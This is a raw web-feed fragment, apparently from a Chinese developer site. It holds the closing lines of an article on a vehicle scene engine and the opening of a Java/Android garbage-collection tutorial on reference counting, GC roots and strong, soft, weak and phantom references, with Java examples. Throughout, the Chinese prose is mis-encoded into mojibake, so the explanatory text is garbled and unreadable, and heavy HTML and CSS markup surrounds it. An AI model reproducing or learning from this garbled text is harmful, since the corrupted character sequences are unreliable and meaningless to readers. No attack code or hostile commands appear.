ğŸŸ¢ <span class="hljs-section">[åœºæ™¯æ¿€æ´»]</span> å®‰å…¨æ ¡éªŒé€šè¿‡ï¼šåŠ¨åŠ›ç³»ç»Ÿå·²å°±ç»ªï¼
</code></pre>
<h2 data-id="heading-15">äº”ã€æ€»ç»“</h2>
<p>å›é¡¾ä¸€ä¸‹ï¼Œâ€œåœºæ™¯å¼•æ“â€è¿™ä¸ªæ¦‚å¿µå¬èµ·æ¥é¢‡ä¸ºé«˜ç«¯ï¼Œä½†æ‹†å¼€æ¥çœ‹ï¼Œå®ƒçš„æ ¸å¿ƒå…¶å®å°±æ˜¯ä¸€ä¸ªè§„åˆ™å¼•æ“ã€‚å½“ç„¶ï¼Œæˆ‘ä»¬å½“å‰çš„å®ç°ä»…ä»…æ˜¯ä¸€ä¸ªå¼€ç«¯ï¼Œéšç€å¤§æ¨¡å‹çš„é›†æˆå’Œç”¨æˆ·è¡Œä¸ºæ•°æ®çš„æŒç»­ç§¯ç´¯ï¼Œåœºæ™¯å¼•æ“æœ‰æœ›ä»è¢«åŠ¨å“åº”è§„åˆ™æ¼”è¿›åˆ°ä¸»åŠ¨é¢„æµ‹ç”¨æˆ·æ„å›¾ã€‚å¸Œæœ›è¿™ç¯‡åˆ†äº«èƒ½ä¸ºä½ æä¾›ä¸€äº›çµæ„Ÿå’Œæ€è€ƒã€‚</p>
<p>æœ¬æ–‡æºç ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flinxu-link%2FVehicleSceneEngine" target="_blank" title="https://github.com/linxu-link/VehicleSceneEngine" ref="nofollow noopener noreferrer">github.com/linxu-link/â€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Javaå†…å­˜å›æ”¶æœºåˆ¶ï¼ˆGCï¼‰å®Œæ•´è¯¦è§£]]></title>    <link>https://juejin.cn/post/7592805973119991814</link>    <guid>https://juejin.cn/post/7592805973119991814</guid>    <pubDate>2026-01-08T08:17:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592805973119991814" data-draft-id="7592759140037804073" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Javaå†…å­˜å›æ”¶æœºåˆ¶ï¼ˆGCï¼‰å®Œæ•´è¯¦è§£"/> <meta itemprop="keywords" content="å‰ç«¯,é¢è¯•,Java"/> <meta itemprop="datePublished" content="2026-01-08T08:17:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é’è²843"/> <meta itemprop="url" content="https://juejin.cn/user/541408646929991"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Javaå†…å­˜å›æ”¶æœºåˆ¶ï¼ˆGCï¼‰å®Œæ•´è¯¦è§£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/541408646929991/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é’è²843
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T08:17:56.000Z" title="Thu Jan 08 2026 08:17:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1å°æ—¶+
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ç¬¬ä¸€éƒ¨åˆ†ï¼šåƒåœ¾å›æ”¶åŸºç¡€</h2>
<h3 data-id="heading-1">1. åƒåœ¾å›æ”¶åŸºç¡€</h3>
<h4 data-id="heading-2">1.1 ä»€ä¹ˆæ˜¯åƒåœ¾å›æ”¶</h4>
<p><strong>å®šä¹‰ï¼š</strong></p>
<p>åƒåœ¾å›æ”¶ï¼ˆGarbage Collectionï¼ŒGCï¼‰æ˜¯è‡ªåŠ¨ç®¡ç†å†…å­˜çš„æœºåˆ¶ï¼Œèƒ½å¤Ÿè‡ªåŠ¨è¯†åˆ«å’Œå›æ”¶ä¸å†ä½¿ç”¨çš„å¯¹è±¡ï¼Œé‡Šæ”¾å®ƒä»¬å ç”¨çš„å†…å­˜ç©ºé—´ã€‚</p>
<p><strong>ä½œç”¨ï¼š</strong></p>
<ol>
<li><strong>è‡ªåŠ¨é‡Šæ”¾å†…å­˜</strong>ï¼šä¸éœ€è¦å¼€å‘è€…æ‰‹åŠ¨é‡Šæ”¾å†…å­˜ï¼Œé¿å…å¿˜è®°é‡Šæ”¾å¯¼è‡´çš„å†…å­˜æ³„æ¼</li>
<li><strong>é¿å…å†…å­˜æ³„æ¼</strong>ï¼šè‡ªåŠ¨å›æ”¶ä¸å†ä½¿ç”¨çš„å¯¹è±¡ï¼Œé˜²æ­¢å†…å­˜é€æ¸è¢«å ç”¨</li>
<li><strong>ç®€åŒ–å†…å­˜ç®¡ç†</strong>ï¼šå¼€å‘è€…åªéœ€è¦å…³æ³¨ä¸šåŠ¡é€»è¾‘ï¼Œä¸éœ€è¦å…³å¿ƒå†…å­˜é‡Šæ”¾</li>
<li><strong>æé«˜å¼€å‘æ•ˆç‡</strong>ï¼šå‡å°‘å†…å­˜ç®¡ç†ç›¸å…³çš„bug</li>
</ol>
<p><strong>Androidä¸­çš„é‡è¦æ€§ï¼š</strong></p>
<ol>
<li><strong>å†…å­˜æœ‰é™</strong>ï¼šAndroidè®¾å¤‡å†…å­˜æœ‰é™ï¼Œå¿…é¡»åˆç†ä½¿ç”¨</li>
<li><strong>æ€§èƒ½å½±å“</strong>ï¼šGCæ€§èƒ½ç›´æ¥å½±å“åº”ç”¨æµç•…åº¦</li>
<li><strong>ç”¨æˆ·ä½“éªŒ</strong>ï¼šé¢‘ç¹GCä¼šå¯¼è‡´å¡é¡¿ï¼Œå½±å“ç”¨æˆ·ä½“éªŒ</li>
<li><strong>ç³»ç»Ÿç¨³å®šæ€§</strong>ï¼šå†…å­˜ä¸è¶³å¯èƒ½å¯¼è‡´åº”ç”¨è¢«ç³»ç»Ÿæ€æ­»</li>
</ol>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GarbageCollectionExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createObjects</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// åˆ›å»ºå¯¹è±¡</span>
        <span class="hljs-type">Object</span> <span class="hljs-variable">obj1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
        <span class="hljs-type">Object</span> <span class="hljs-variable">obj2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
        
        <span class="hljs-comment">// obj1å’Œobj2ä¸å†è¢«å¼•ç”¨åï¼ŒGCä¼šè‡ªåŠ¨å›æ”¶å®ƒä»¬å ç”¨çš„å†…å­˜</span>
        <span class="hljs-comment">// å¼€å‘è€…ä¸éœ€è¦æ‰‹åŠ¨é‡Šæ”¾</span>
    }
}
</code></pre>
<h4 data-id="heading-3">1.2 å¦‚ä½•åˆ¤æ–­å¯¹è±¡å·²æ­»ï¼ˆå“ªäº›å¯¹è±¡å¯ä»¥è¢«å›æ”¶ï¼‰</h4>
<p><strong>æ ¸å¿ƒé—®é¢˜ï¼š</strong> GCéœ€è¦çŸ¥é“å“ªäº›å¯¹è±¡æ˜¯"åƒåœ¾"ï¼ˆä¸å†ä½¿ç”¨ï¼‰ï¼Œå“ªäº›å¯¹è±¡è¿˜åœ¨ä½¿ç”¨ã€‚</p>
<h5 data-id="heading-4">1.2.1 å¼•ç”¨è®¡æ•°ç®—æ³•ï¼ˆAndroidä¸ä½¿ç”¨ï¼Œäº†è§£å³å¯ï¼‰</h5>
<p><strong>åŸç†ï¼š</strong></p>
<p>æ¯ä¸ªå¯¹è±¡æœ‰ä¸€ä¸ªå¼•ç”¨è®¡æ•°å™¨ï¼Œå½“å¯¹è±¡è¢«å¼•ç”¨æ—¶è®¡æ•°å™¨+1ï¼Œå–æ¶ˆå¼•ç”¨æ—¶è®¡æ•°å™¨-1ã€‚å½“è®¡æ•°å™¨ä¸º0æ—¶ï¼Œå¯¹è±¡å¯ä»¥è¢«å›æ”¶ã€‚</p>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// å¼•ç”¨è®¡æ•° = 1</span>
<span class="hljs-type">Object</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> obj;           <span class="hljs-comment">// å¼•ç”¨è®¡æ•° = 2</span>
obj = <span class="hljs-literal">null</span>;                 <span class="hljs-comment">// å¼•ç”¨è®¡æ•° = 1</span>
ref = <span class="hljs-literal">null</span>;                 <span class="hljs-comment">// å¼•ç”¨è®¡æ•° = 0ï¼Œå¯¹è±¡å¯ä»¥è¢«å›æ”¶</span>
</code></pre>
<p><strong>ä¼˜ç‚¹ï¼š</strong></p>
<ul>
<li>å®ç°ç®€å•</li>
<li>å›æ”¶åŠæ—¶ï¼Œå¯¹è±¡ä¸å†è¢«å¼•ç”¨æ—¶ç«‹å³å›æ”¶</li>
</ul>
<p><strong>ç¼ºç‚¹ï¼š</strong></p>
<ul>
<li><strong>æ— æ³•å¤„ç†å¾ªç¯å¼•ç”¨</strong>ï¼šä¸¤ä¸ªå¯¹è±¡ç›¸äº’å¼•ç”¨ï¼Œå¼•ç”¨è®¡æ•°æ°¸è¿œä¸ä¸º0ï¼Œå¯¼è‡´å†…å­˜æ³„æ¼</li>
</ul>
<p><strong>å¾ªç¯å¼•ç”¨ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Node</span> {
    Node next;
}

<span class="hljs-type">Node</span> <span class="hljs-variable">node1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>();
<span class="hljs-type">Node</span> <span class="hljs-variable">node2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>();
node1.next = node2;  <span class="hljs-comment">// node1å¼•ç”¨node2</span>
node2.next = node1;  <span class="hljs-comment">// node2å¼•ç”¨node1</span>

<span class="hljs-comment">// å³ä½¿node1å’Œnode2éƒ½ä¸å†è¢«å¤–éƒ¨å¼•ç”¨</span>
<span class="hljs-comment">// å®ƒä»¬çš„å¼•ç”¨è®¡æ•°éƒ½æ˜¯1ï¼ˆç›¸äº’å¼•ç”¨ï¼‰ï¼Œæ— æ³•è¢«å›æ”¶</span>
<span class="hljs-comment">// è¿™å°±æ˜¯å†…å­˜æ³„æ¼</span>
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆAndroidä¸ç”¨ï¼š</strong></p>
<p>Androidä¸ä½¿ç”¨å¼•ç”¨è®¡æ•°ç®—æ³•ï¼Œå› ä¸ºæ— æ³•å¤„ç†å¾ªç¯å¼•ç”¨ï¼Œä¼šå¯¼è‡´å†…å­˜æ³„æ¼ã€‚Androidä½¿ç”¨å¯è¾¾æ€§åˆ†æç®—æ³•ã€‚</p>
<h5 data-id="heading-5">1.2.2 å¯è¾¾æ€§åˆ†æç®—æ³•ï¼ˆAndroidä½¿ç”¨è¿™ä¸ªï¼‰</h5>
<p><strong>åŸç†ï¼š</strong></p>
<p>ä»ä¸€ç»„ç§°ä¸º"GC Roots"çš„å¯¹è±¡å¼€å§‹ï¼Œå‘ä¸‹æœç´¢ï¼Œæ‰€æœ‰èƒ½å¤Ÿä»GC Rootsåˆ°è¾¾çš„å¯¹è±¡éƒ½æ˜¯"å­˜æ´»"çš„ï¼Œæ— æ³•åˆ°è¾¾çš„å¯¹è±¡å°±æ˜¯"åƒåœ¾"ï¼Œå¯ä»¥è¢«å›æ”¶ã€‚</p>
<p><strong>ç®—æ³•æµç¨‹ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> ä»GC Rootså¼€å§‹
<span class="hljs-bullet">2.</span> æ ‡è®°æ‰€æœ‰èƒ½åˆ°è¾¾çš„å¯¹è±¡ï¼ˆå­˜æ´»å¯¹è±¡ï¼‰
<span class="hljs-bullet">3.</span> æœªæ ‡è®°çš„å¯¹è±¡å°±æ˜¯åƒåœ¾ï¼Œå¯ä»¥è¢«å›æ”¶
</code></pre>
<p><strong>GC Rootså¯¹è±¡æœ‰å“ªäº›ï¼ˆAndroidåœºæ™¯ï¼‰ï¼š</strong></p>
<ol>
<li><strong>è™šæ‹Ÿæœºæ ˆä¸­å¼•ç”¨çš„å¯¹è±¡</strong>
<ul>
<li>å±€éƒ¨å˜é‡ã€æ–¹æ³•å‚æ•°</li>
<li>ç¤ºä¾‹ï¼šæ–¹æ³•ä¸­çš„å±€éƒ¨å˜é‡å¼•ç”¨çš„å¯¹è±¡</li>
</ul>
</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> {
    <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// objåœ¨æ ˆä¸­ï¼Œå¼•ç”¨çš„å¯¹è±¡æ˜¯GC Root</span>
    <span class="hljs-comment">// objå¼•ç”¨çš„å¯¹è±¡ä¸ä¼šè¢«å›æ”¶</span>
}
</code></pre>
<ol start="2">
<li><strong>æ–¹æ³•åŒºä¸­é™æ€å±æ€§å¼•ç”¨çš„å¯¹è±¡</strong>
<ul>
<li>staticå˜é‡</li>
<li>ç¤ºä¾‹ï¼šç±»çš„é™æ€å˜é‡</li>
</ul>
</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Object</span> <span class="hljs-variable">staticObj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// staticObjæ˜¯GC Root</span>
    <span class="hljs-comment">// staticObjå¼•ç”¨çš„å¯¹è±¡ä¸ä¼šè¢«å›æ”¶</span>
}
</code></pre>
<ol start="3">
<li><strong>æ–¹æ³•åŒºä¸­å¸¸é‡å¼•ç”¨çš„å¯¹è±¡</strong>
<ul>
<li>å¸¸é‡</li>
<li>ç¤ºä¾‹ï¼šå­—ç¬¦ä¸²å¸¸é‡</li>
</ul>
</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CONSTANT</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Hello"</span>;  <span class="hljs-comment">// CONSTANTæ˜¯GC Root</span>
}
</code></pre>
<ol start="4">
<li>
<p><strong>æœ¬åœ°æ–¹æ³•æ ˆä¸­å¼•ç”¨çš„å¯¹è±¡</strong></p>
<ul>
<li>Nativeæ–¹æ³•ä¸­çš„å¼•ç”¨</li>
<li>ç¤ºä¾‹ï¼šJNIè°ƒç”¨ä¸­çš„å¯¹è±¡</li>
</ul>
</li>
<li>
<p><strong>åŒæ­¥é”æŒæœ‰çš„å¯¹è±¡</strong></p>
<ul>
<li>synchronizedæŒæœ‰çš„å¯¹è±¡</li>
<li>ç¤ºä¾‹ï¼šé”å¯¹è±¡</li>
</ul>
</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Object</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
<span class="hljs-keyword">synchronized</span> (lock) {
    <span class="hljs-comment">// lockæ˜¯GC Rootï¼Œä¸ä¼šè¢«å›æ”¶</span>
}
</code></pre>
<ol start="6">
<li><strong>å†…éƒ¨å¼•ç”¨</strong>
<ul>
<li>Classå¯¹è±¡ã€å¼‚å¸¸å¯¹è±¡ç­‰</li>
<li>ç¤ºä¾‹ï¼šç±»çš„Classå¯¹è±¡</li>
</ul>
</li>
</ol>
<p><strong>ä¼˜ç‚¹ï¼š</strong></p>
<ul>
<li>èƒ½å¤„ç†å¾ªç¯å¼•ç”¨ï¼Œå‡†ç¡®åˆ¤æ–­å¯¹è±¡æ˜¯å¦å¯å›æ”¶</li>
<li>ä¸ä¼šå› ä¸ºå¾ªç¯å¼•ç”¨å¯¼è‡´å†…å­˜æ³„æ¼</li>
</ul>
<p><strong>ç¼ºç‚¹ï¼š</strong></p>
<ul>
<li>éœ€è¦æš‚åœåº”ç”¨ï¼ˆSTW - Stop The Worldï¼‰ï¼Œä½†Androidä¼˜åŒ–äº†è¿™ä¸ªé—®é¢˜ï¼Œä½¿ç”¨å¹¶å‘å›æ”¶å‡å°‘æš‚åœæ—¶é—´</li>
</ul>
<p><strong>å¾ªç¯å¼•ç”¨ç¤ºä¾‹ï¼ˆå¯è¾¾æ€§åˆ†æå¯ä»¥å¤„ç†ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Node</span> {
    Node next;
}

<span class="hljs-type">Node</span> <span class="hljs-variable">node1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>();
<span class="hljs-type">Node</span> <span class="hljs-variable">node2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>();
node1.next = node2;
node2.next = node1;

<span class="hljs-comment">// å¦‚æœnode1å’Œnode2éƒ½ä¸å†è¢«GC Rootså¼•ç”¨</span>
<span class="hljs-comment">// å³ä½¿å®ƒä»¬ç›¸äº’å¼•ç”¨ï¼Œä¹Ÿæ— æ³•ä»GC Rootsåˆ°è¾¾</span>
<span class="hljs-comment">// æ‰€ä»¥å®ƒä»¬éƒ½æ˜¯åƒåœ¾ï¼Œå¯ä»¥è¢«å›æ”¶</span>
</code></pre>
<h5 data-id="heading-6">1.2.3 å¼•ç”¨ç±»å‹ï¼ˆAndroidå¼€å‘ä¸­å¸¸ç”¨ï¼‰</h5>
<p><strong>1. å¼ºå¼•ç”¨ï¼ˆStrong Referenceï¼‰</strong></p>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>æœ€å¸¸è§çš„å¼•ç”¨ç±»å‹</li>
<li>åªè¦å¼ºå¼•ç”¨å­˜åœ¨ï¼Œå¯¹è±¡å°±ä¸ä¼šè¢«GCå›æ”¶</li>
<li>å³ä½¿å†…å­˜ä¸è¶³ï¼Œä¹Ÿä¸ä¼šå›æ”¶</li>
</ul>
<p><strong>Androidä½¿ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>æ™®é€šå¯¹è±¡å¼•ç”¨</li>
<li>Activityå¼•ç”¨</li>
<li>å¤§éƒ¨åˆ†å¯¹è±¡éƒ½æ˜¯å¼ºå¼•ç”¨</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// å¼ºå¼•ç”¨</span>
<span class="hljs-comment">// objå¼•ç”¨çš„å¯¹è±¡ä¸ä¼šè¢«å›æ”¶ï¼Œé™¤éobj = null</span>
</code></pre>
<p><strong>2. è½¯å¼•ç”¨ï¼ˆSoft Referenceï¼‰</strong></p>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>å†…å­˜ä¸è¶³æ—¶æ‰å›æ”¶</li>
<li>é€‚åˆç¼“å­˜åœºæ™¯</li>
<li>å¯ä»¥é…åˆå¼•ç”¨é˜Ÿåˆ—ä½¿ç”¨</li>
</ul>
<p><strong>Androidä½¿ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>Androidä¸æ¨èä½¿ç”¨è½¯å¼•ç”¨</li>
<li>å› ä¸ºAndroidè®¾å¤‡å†…å­˜æœ‰é™ï¼Œè½¯å¼•ç”¨å¯èƒ½å¾ˆå¿«è¢«å›æ”¶</li>
<li>å»ºè®®ä½¿ç”¨LruCacheç­‰æœ‰å¤§å°é™åˆ¶çš„ç¼“å­˜</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java">SoftReference&lt;Bitmap&gt; softRef = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoftReference</span>&lt;&gt;(bitmap);
<span class="hljs-type">Bitmap</span> <span class="hljs-variable">bitmap</span> <span class="hljs-operator">=</span> softRef.get();  <span class="hljs-comment">// å¯èƒ½è¿”å›nullï¼ˆå¦‚æœè¢«å›æ”¶äº†ï¼‰</span>
</code></pre>
<p><strong>3. å¼±å¼•ç”¨ï¼ˆWeak Referenceï¼‰</strong></p>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>åªè¦GCå°±ä¼šå›æ”¶ï¼Œä¸ä¼šé˜»æ­¢å¯¹è±¡è¢«å›æ”¶</li>
<li>é€‚åˆé¿å…å†…å­˜æ³„æ¼çš„åœºæ™¯</li>
</ul>
<p><strong>Androidä½¿ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>é¿å…å†…å­˜æ³„æ¼ï¼ˆHandlerã€é™æ€å˜é‡æŒæœ‰å¯¹è±¡æ—¶ï¼‰</li>
<li>ç¼“å­˜åœºæ™¯ï¼ˆWeakHashMapï¼‰</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// é¿å…Handlerå†…å­˜æ³„æ¼</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Handler</span> {
    <span class="hljs-keyword">private</span> WeakReference&lt;Activity&gt; activityRef;
    
    MyHandler(Activity activity) {
        activityRef = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakReference</span>&lt;&gt;(activity);
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleMessage</span><span class="hljs-params">(Message msg)</span> {
        <span class="hljs-type">Activity</span> <span class="hljs-variable">activity</span> <span class="hljs-operator">=</span> activityRef.get();
        <span class="hljs-keyword">if</span> (activity != <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// ä½¿ç”¨activity</span>
        }
    }
}
</code></pre>
<p><strong>4. è™šå¼•ç”¨ï¼ˆPhantom Referenceï¼‰</strong></p>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>æœ€å¼±çš„å¼•ç”¨ç±»å‹</li>
<li>ä¸»è¦ç”¨äºå¯¹è±¡å›æ”¶å‰çš„æ¸…ç†å·¥ä½œ</li>
<li>æ— æ³•é€šè¿‡è™šå¼•ç”¨è·å–å¯¹è±¡</li>
</ul>
<p><strong>Androidä½¿ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>å¾ˆå°‘ä½¿ç”¨</li>
